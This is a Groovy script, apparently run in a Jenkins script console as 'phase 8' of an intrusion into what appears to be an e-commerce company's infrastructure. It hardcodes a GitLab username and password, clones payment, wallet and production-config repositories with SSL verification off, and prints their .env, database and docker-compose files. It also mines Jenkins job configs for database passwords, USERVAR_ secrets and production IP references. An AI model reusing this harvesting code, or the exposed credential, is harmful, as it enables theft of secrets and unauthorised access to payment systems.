// PHASE 8: Read monedero-api + find USERVAR_ values in Jenkins jobs
// Fix: read proc.inputStream BEFORE waitForOrKill

def user = "jenkins"
def pass = "e6LBqIkOI\$PR1XX2oia"
def passEnc = java.net.URLEncoder.encode(pass, "UTF-8")
def glBase = "https://gitlab.dev.claroshop.com"
def cloneBase = glBase.replace("https://", "https://${user}:${passEnc}@")
def DEST_BASE = "/tmp/glr_"

def gitClone = { repoPath ->
    def dest = DEST_BASE + repoPath.replace('/', '__')
    def f = new File(dest)
    if (f.exists() && f.isDirectory() && (f.list()?.length?:0) > 2) {
        return [success: true, dest: dest, files: f.list()]
    }
    try { ["bash","-c","rm -rf '${dest}'"].execute().waitFor() } catch(e) {}
    def cloneUrl = "${cloneBase}/${repoPath}.git"
    def pb = ["bash","-c","GIT_TERMINAL_PROMPT=0 GIT_SSL_NO_VERIFY=1 git clone --depth=1 '${cloneUrl}' '${dest}'"]
    def proc = pb.execute()
    def errOut = new StringBuilder()
    proc.consumeProcessErrorStream(errOut)
    proc.waitForOrKill(30000)
    def f2 = new File(dest)
    def ok = f2.exists() && f2.isDirectory() && (f2.list()?.length?:0) > 1
    return [success: ok, dest: dest, files: f2.list(), err: errOut.toString().take(100)]
}

def readConfigs = { destDir ->
    def f = new File(destDir)
    if (!f.exists() || !f.isDirectory()) return [:]
    def results = [:]
    try {
        f.eachFileRecurse { file ->
            if (!file.isFile()) return
            def path = file.absolutePath.replace(destDir, "")
            if (path.contains("/.git/") || path.contains("/vendor/") ||
                path.contains("/node_modules/") || file.length() > 300000) return
            def name = file.name
            def isConfig = name in [".env", ".env.local", ".env.production", ".env.prod",
                                     "local.php", "database.php", "database.yml",
                                     "docker-compose.yml", "docker-compose.prod.yml"] ||
                           name.endsWith(".env") ||
                           (name == "config.php" && path.contains("/config"))
            if (isConfig) {
                try { results[path] = file.text.take(8000) } catch(e) {}
            }
        }
    } catch(ex) {}
    return results
}

// ===== PART 1: Read monedero-api (already cloned) =====
println "=== PART 1: READ monedero-api ==="
def monederoDir = "${DEST_BASE}claroshop__monedero-api"
def configs = readConfigs(monederoDir)
if (configs) {
    configs.each { p, content ->
        println "\n  >> ${p}:"
        println content
        println "  <<"
    }
} else {
    println "  No config files. Listing:"
    def mf = new File(monederoDir)
    if (mf.exists()) {
        mf.eachFileRecurse { ff ->
            if (!ff.absolutePath.contains("/.git/") && !ff.absolutePath.contains("/vendor/"))
                println "    ${ff.absolutePath.replace(monederoDir,'')}"
        }
    } else { println "  DIR NOT FOUND: ${monederoDir}" }
}

// ===== PART 2: More targeted clones =====
println "\n=== PART 2: TARGETED CLONES ==="
def repos = [
    "claroshop/sears-api",
    "claroshop/t1pagos-api",
    "sears/sears-api",
    "sears/backend-api",
    "sears/payment",
    "claroshop/environment-configs",
    "claroshop/docker-configs",
    "claroshop/prod-config",
    "devops/prod-configs",
    "ops/production",
    "infracode/env-configs",
]
def successful = [
    [repo: "claroshop/caja-pagos-api", dest: "${DEST_BASE}claroshop__caja-pagos-api"],
    [repo: "claroshop/monedero-api", dest: "${DEST_BASE}claroshop__monedero-api"],
]
repos.each { repo ->
    def r = gitClone(repo)
    if (r.success) {
        println "  CLONED: ${repo} -> ${r.files?.join(',')?.take(100)}"
        successful << [repo: repo, dest: r.dest]
    }
}

// ===== PART 3: Find USERVAR_* values in Jenkins jobs =====
println "\n=== PART 3: USERVAR_ VALUES IN JENKINS JOBS ==="
def jobsDir = new File("/var/jenkins_home/jobs")
def userVars = [:]
def dbVars = [:]

jobsDir.eachFileRecurse { f ->
    if (f.name != "config.xml") return
    def text = f.text
    if (!text.contains("USERVAR_") && !text.contains("DB_")) return
    
    def jobName = f.parentFile.parentFile.name
    
    // Extract USERVAR_ key=value pairs
    (text =~ /USERVAR_[A-Z_]+['">\s]*[:=]['">\s]*([^<"'\s,]+)/).each { m ->
        def full = m[0]
        def val = m[1]
        if (val.length() > 2 && !val.startsWith("getenv") && !val.startsWith("\$")) {
            userVars["${jobName}::${full}"] = val
        }
    }
    
    // Extract DB credentials patterns
    (text =~ /(DB_HOST|DB_PASSWORD|DB_USER|DB_NAME|DATABASE_URL)['">\s]*[:=]['">\s]*([^<"'\s]{3,})/).each { m ->
        dbVars["${jobName}::${m[1]}"] = m[2]
    }
    
    // Look for env var blocks
    if (text.contains("172.27.141") || text.contains("dbasears") || text.contains("apifincadob") || 
        text.contains("payment_t1")) {
        println "\n  JOB WITH PROD REFS: ${f.absolutePath}"
        // Extract environment block
        def envMatch = text =~ /(?s)<environment>(.{1,2000})<\/environment>/
        if (envMatch) println "  ENV: ${envMatch[0][1].take(500)}"
        
        // Extract parametersDefinitions
        def paramMatch = text =~ /(?s)<defaultValue>([^<]+)<\/defaultValue>/
        paramMatch.each { pm -> 
            if (pm[1].contains("172.27") || pm[1].contains("sears") || pm[1].length() > 5)
                println "  PARAM: ${pm[1].take(100)}"
        }
    }
}

if (userVars) {
    println "\n  USERVAR_ VALUES FOUND:"
    userVars.take(50).each { k, v -> println "    ${k} = ${v}" }
}
if (dbVars) {
    println "\n  DB VARS FOUND:"
    dbVars.take(50).each { k, v -> println "    ${k} = ${v}" }
}

// ===== PART 4: Find PROD Sears references in Jenkins job configs =====
println "\n=== PART 4: PROD SEARS/T1PAGOS REFS IN JENKINS ==="
def keywords = ["dbasears", "mrc-services", "apifincadob", "payment_t1", "app_t1", "172.27.141.4", "172.27.141.6", "172.27.141.24"]
jobsDir.eachFileRecurse { f ->
    if (f.name != "config.xml") return
    def text = f.text
    def found = keywords.findAll { k -> text.contains(k) }
    if (found) {
        println "\n  JOB: ${f.parentFile.parentFile.name}"
        println "  Keywords: ${found}"
        // Extract env vars from withEnv blocks
        (text =~ /(?s)<string>([A-Z_]+=.{1,200})<\/string>/).each { m ->
            if (found.any { k -> m[1].contains(k) || m[1].contains("DB_") || m[1].contains("PASS") })
                println "  STRING: ${m[1].take(200)}"
        }
        // Extract parameter default values  
        (text =~ /(?s)<name>([^<]+)<\/name>\s*<description>[^<]*<\/description>\s*<defaultValue>([^<]+)<\/defaultValue>/).each { m ->
            println "  PARAM[${m[1]}]: ${m[2].take(100)}"
        }
    }
}

// ===== PART 5: Read amdocs endpoint from caja-pagos-api full config =====
println "\n=== PART 5: FULL caja-pagos-api local.php ==="
def cajaPHP = new File("${DEST_BASE}claroshop__caja-pagos-api/config/local.php")
if (cajaPHP.exists()) println cajaPHP.text
else println "  NOT FOUND"

println "\n=== DONE PHASE 8 ==="
